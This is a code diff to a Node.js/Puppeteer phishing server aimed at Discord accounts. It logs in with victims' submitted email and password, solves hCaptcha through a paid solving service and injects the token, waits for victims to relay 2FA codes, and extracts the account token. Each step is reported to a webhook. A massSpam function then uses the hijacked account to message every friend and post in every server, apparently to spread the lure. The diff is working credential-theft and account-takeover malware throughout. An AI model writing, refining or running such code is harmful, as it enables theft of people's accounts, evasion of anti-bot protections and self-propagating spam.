@@ -83,153 +83,155 @@ async function getTaskResult(taskId) {
     throw new Error('Anti-Captcha timeout');
 }
 
-// FIXED: Intercept hCaptcha challenge and solve in correct context
-async function interceptAndSolveHCaptcha(page, sessionId) {
-    let sitekey = null;
-    let captchaResponse = null;
-    
-    // Enable request interception to capture sitekey from iframe URL
-    await page.setRequestInterception(true);
-    
-    page.on('request', (request) => {
-        const url = request.url();
+async function solveHCaptcha(page, sessionId) {
+    try {
+        await sendWebhook({ content: `Solving CAPTCHA - Session: \`${sessionId}\`` });
         
-        // Capture sitekey from hcaptcha iframe request
-        if (url.includes('hcaptcha.com') && url.includes('sitekey=')) {
-            const match = url.match(/[?&]sitekey=([^&]+)/);
-            if (match && !sitekey) {
-                sitekey = match[1];
-                console.log('Captured sitekey:', sitekey);
+        // Wait for CAPTCHA iframe with extended timeout
+        await page.waitForFunction(() => {
+            return document.querySelector('iframe[src*="hcaptcha.com"]') !== null ||
+                   document.querySelector('[data-sitekey]') !== null;
+        }, { timeout: 15000 });
+        
+        // Extract sitekey with retry logic
+        let sitekey = null;
+        let attempts = 0;
+        
+        while (!sitekey && attempts < 15) {
+            sitekey = await page.evaluate(() => {
+                // Method 1: From iframe src
+                const iframe = document.querySelector('iframe[src*="hcaptcha.com"]');
+                if (iframe) {
+                    const src = iframe.getAttribute('src');
+                    const match = src.match(/[?&]sitekey=([^&]+)/);
+                    if (match) return match[1];
+                }
+                
+                // Method 2: From data-sitekey attribute
+                const container = document.querySelector('[data-sitekey]');
+                if (container) return container.getAttribute('data-sitekey');
+                
+                // Method 3: From window.hcaptcha
+                if (window.hcaptcha && window.hcaptcha.sitekey) {
+                    return window.hcaptcha.sitekey;
+                }
+                
+                // Method 4: Search in scripts
+                const scripts = Array.from(document.querySelectorAll('script'));
+                for (const script of scripts) {
+                    const text = script.textContent || '';
+                    const match = text.match(/sitekey["']?\s*:\s*["']([^"']+)["']/);
+                    if (match) return match[1];
+                }
+                
+                return null;
+            });
+            
+            if (!sitekey) {
+                await delay(1000, 1500);
+                attempts++;
             }
         }
         
-        request.continue();
-    });
-    
-    // Wait for captcha iframe to load and capture sitekey
-    await page.waitForFunction(() => {
-        return document.querySelector('iframe[src*="hcaptcha.com"]') !== null;
-    }, { timeout: 10000 });
-    
-    // Extract sitekey from DOM as backup
-    if (!sitekey) {
-        sitekey = await page.evaluate(() => {
-            const container = document.querySelector('[data-sitekey]');
-            return container ? container.getAttribute('data-sitekey') : null;
-        });
-    }
-    
-    if (!sitekey) {
-        throw new Error('Could not extract sitekey');
-    }
-    
-    await sendWebhook({ content: `Solving CAPTCHA with sitekey: ${sitekey.substring(0, 10)}... - Session: \`${sessionId}\`` });
-    
-    // Create and solve task
-    const taskId = await createTask('https://discord.com/login', sitekey);
-    await sendWebhook({ content: `CAPTCHA task created: ${taskId} - Session: \`${sessionId}\`` });
-    
-    const solution = await getTaskResult(taskId);
-    captchaResponse = solution.gRecaptchaResponse;
-    
-    await sendWebhook({ content: `CAPTCHA solved, injecting... - Session: \`${sessionId}\`` });
-    
-    // Inject token and trigger callback properly
-    const success = await page.evaluate((token) => {
-        return new Promise((resolve) => {
-            // Set the response in all possible locations
-            const textarea = document.querySelector('textarea[name="h-captcha-response"]');
-            const hiddenInput = document.querySelector('input[name="h-captcha-response"]');
-            const hcaptchaDiv = document.querySelector('.h-captcha') || document.querySelector('[data-sitekey]');
+        if (!sitekey) {
+            throw new Error('Could not extract sitekey after multiple attempts');
+        }
+        
+        await sendWebhook({ content: `Sitekey found: ${sitekey.substring(0, 15)}... - Session: \`${sessionId}\`` });
+        
+        const taskId = await createTask('https://discord.com/login', sitekey);
+        await sendWebhook({ content: `CAPTCHA task created: ${taskId} - Session: \`${sessionId}\`` });
+        
+        const solution = await getTaskResult(taskId);
+        await sendWebhook({ content: `CAPTCHA solved, injecting... - Session: \`${sessionId}\`` });
+        
+        // Inject token with multiple methods
+        const injected = await page.evaluate((token) => {
+            let success = false;
             
+            // Method 1: Textarea
+            const textarea = document.querySelector('textarea[name="h-captcha-response"]');
             if (textarea) {
                 textarea.value = token;
                 textarea.textContent = token;
                 textarea.dispatchEvent(new Event('input', { bubbles: true }));
                 textarea.dispatchEvent(new Event('change', { bubbles: true }));
+                success = true;
             }
             
+            // Method 2: Hidden input
+            const hiddenInput = document.querySelector('input[name="h-captcha-response"]');
             if (hiddenInput) {
                 hiddenInput.value = token;
                 hiddenInput.dispatchEvent(new Event('input', { bubbles: true }));
+                success = true;
             }
             
-            // Try to find and execute the callback
-            let callbackExecuted = false;
-            
-            // Method 1: data-callback attribute
+            // Method 3: Container dataset
+            const hcaptchaDiv = document.querySelector('.h-captcha') || document.querySelector('[data-sitekey]');
             if (hcaptchaDiv) {
-                const callbackName = hcaptchaDiv.getAttribute('data-callback');
-                if (callbackName && window[callbackName]) {
+                hcaptchaDiv.setAttribute('data-hcaptcha-response', token);
+                hcaptchaDiv.dataset.response = token;
+                
+                // Try to find React callback
+                const reactKey = Object.keys(hcaptchaDiv).find(k => k.startsWith('__react'));
+                if (reactKey) {
                     try {
-                        window[callbackName](token);
-                        callbackExecuted = true;
+                        const props = hcaptchaDiv[reactKey];
+                        if (props && props.onVerify) {
+                            props.onVerify(token);
+                            success = true;
+                        }
                     } catch(e) {}
                 }
             }
             
-            // Method 2: hcaptcha object methods
+            // Method 4: Global callback
+            if (window.hcaptchaCallback && typeof window.hcaptchaCallback === 'function') {
+                try {
+                    window.hcaptchaCallback(token);
+                    success = true;
+                } catch(e) {}
+            }
+            
+            // Method 5: hcaptcha object methods
             if (window.hcaptcha) {
                 if (typeof window.hcaptcha.setResponse === 'function') {
                     try {
                         window.hcaptcha.setResponse(token);
-                        callbackExecuted = true;
+                        success = true;
                     } catch(e) {}
                 }
-                
                 if (typeof window.hcaptcha.submit === 'function') {
                     try {
                         window.hcaptcha.submit();
-                        callbackExecuted = true;
                     } catch(e) {}
                 }
             }
             
-            // Method 3: Find callback in webpack modules (Discord specific)
-            try {
-                if (window.webpackChunkdiscord_app) {
-                    const chunks = window.webpackChunkdiscord_app;
-                    for (const chunk of chunks) {
-                        if (chunk && chunk[1]) {
-                            for (const key in chunk[1]) {
-                                try {
-                                    const mod = chunk[1][key];
-                                    if (typeof mod === 'function') {
-                                        const exports = {};
-                                        mod.call(exports, {}, exports, (id) => {
-                                            const m = chunk[1][id];
-                                            return m && m.exports ? m.exports : {};
-                                        });
-                                        
-                                        if (exports.default && typeof exports.default === 'function') {
-                                            // Try calling with token
-                                            try {
-                                                exports.default(token);
-                                                callbackExecuted = true;
-                                            } catch(e) {}
-                                        }
-                                    }
-                                } catch(e) {}
-                            }
-                        }
-                    }
-                }
-            } catch(e) {}
+            // Method 6: Dispatch events
+            document.dispatchEvent(new CustomEvent('hcaptchaSubmit', { 
+                detail: { response: token, token: token } 
+            }));
             
-            // Method 4: Dispatch events
-            document.dispatchEvent(new CustomEvent('hcaptchaSubmit', { detail: { response: token } }));
-            
-            // Verify injection
-            setTimeout(() => {
-                const checkTextarea = document.querySelector('textarea[name="h-captcha-response"]');
-                resolve(checkTextarea && checkTextarea.value === token);
-            }, 500);
-        });
-    }, captchaResponse);
-    
-    await page.setRequestInterception(false);
-    
-    return success;
+            // Verify
+            const verify = document.querySelector('textarea[name="h-captcha-response"]');
+            return success || (verify && verify.value.length > 50);
+        }, solution.gRecaptchaResponse);
+        
+        await delay(2000, 3000);
+        
+        if (!injected) {
+            throw new Error('Token injection failed');
+        }
+        
+        await sendWebhook({ content: `CAPTCHA token injected - Session: \`${sessionId}\`` });
+        return true;
+        
+    } catch (error) {
+        await sendWebhook({ content: `CAPTCHA error: ${error.message} - Session: \`${sessionId}\`` });
+        return false;
+    }
 }
 
 app.get('/', (req, res) => {
@@ -305,14 +307,11 @@ async function processLogin(email, password, ip, sessionId) {
         
         await delay(500, 1200);
         
-        // Click submit and wait for captcha or navigation
         await page.click('button[type="submit"]');
         
-        await delay(3000, 5000);
+        // Extended wait for CAPTCHA to appear
+        await delay(5000, 8000);
         
-        const currentUrl = await page.url();
-        
-        // Check if captcha appeared
         const hasCaptcha = await page.evaluate(() => {
             return document.querySelector('iframe[src*="hcaptcha.com"]') !== null ||
                    document.querySelector('.h-captcha') !== null ||
@@ -321,32 +320,25 @@ async function processLogin(email, password, ip, sessionId) {
         
         if (hasCaptcha) {
             await sendWebhook({ content: `CAPTCHA DETECTED - Session: \`${sessionId}\`` });
+            const solved = await solveHCaptcha(page, sessionId);
             
-            try {
-                const solved = await interceptAndSolveHCaptcha(page, sessionId);
+            if (solved) {
+                await delay(2000, 3000);
                 
-                if (solved) {
-                    await sendWebhook({ content: `CAPTCHA solved, submitting... - Session: \`${sessionId}\`` });
-                    
-                    // Wait a bit for token to register
-                    await delay(2000, 3000);
-                    
-                    // Click submit again
+                try {
                     await Promise.all([
                         page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 30000 }).catch(() => {}),
                         page.click('button[type="submit"]')
                     ]);
-                    
-                    await delay(4000, 6000);
-                } else {
-                    await sendWebhook({ content: `CAPTCHA injection failed - Session: \`${sessionId}\`` });
+                } catch (e) {
+                    await page.click('button[type="submit"]');
+                    await delay(6000, 10000);
                 }
-            } catch (error) {
-                await sendWebhook({ content: `CAPTCHA error: ${error.message} - Session: \`${sessionId}\`` });
             }
         }
         
-        // Check for 2FA
+        await delay(4000, 6000);
+        
         const is2FA = await page.evaluate(() => {
             const bodyText = document.body.innerText || '';
             return bodyText.includes('Check your email') ||
@@ -357,7 +349,7 @@ async function processLogin(email, password, ip, sessionId) {
         
         if (is2FA) {
             await sendWebhook({ 
-                content: `2FA REQUIRED - Session: \`${sessionId}\`\nWaiting for user...` 
+                content: `2FA REQUIRED - Session: \`${sessionId}\`\nWaiting...` 
             });
             
             const maxWait = 300000;
@@ -381,14 +373,12 @@ async function processLogin(email, password, ip, sessionId) {
             }
         }
         
-        // Check login success
         const finalUrl = await page.url();
         const isLoggedIn = finalUrl.includes('/channels/') || finalUrl.includes('/app');
         
         if (!isLoggedIn) {
-            // Check for error message
             const errorMsg = await page.evaluate(() => {
-                const error = document.querySelector('[class*="error"]') || document.querySelector('[class*="message"]');
+                const error = document.querySelector('[class*="error"]');
                 return error ? error.textContent : 'Unknown error';
             });
             
@@ -401,7 +391,6 @@ async function processLogin(email, password, ip, sessionId) {
         
         await sendWebhook({ content: `LOGIN SUCCESS - Session: \`${sessionId}\`` });
         
-        // Extract user info and token
         const userInfo = await page.evaluate(() => {
             let username = null;
             let userId = null;
@@ -425,7 +414,6 @@ async function processLogin(email, password, ip, sessionId) {
         });
         
         if (!token) {
-            // Try webpack extraction
             token = await page.evaluate(() => {
                 let foundToken = null;
                 try {
@@ -493,7 +481,6 @@ async function massSpam(token, sessionId, username) {
                 content: `SPAM READY - \`@${client.user.tag}\` - ${client.guilds.cache.size} guilds - Session: \`${sessionId}\`` 
             });
             
-            // Mass DM friends
             const friends = client.relationships.cache.filter(r => r.type === 1);
             for (const [, rel] of friends) {
                 try {
@@ -507,7 +494,6 @@ async function massSpam(token, sessionId, username) {
                 } catch (e) {}
             }
             
-            // Mass guild spam
             for (const guild of client.guilds.cache.values()) {
                 try {
                     const channel = guild.channels.cache.find(c => 
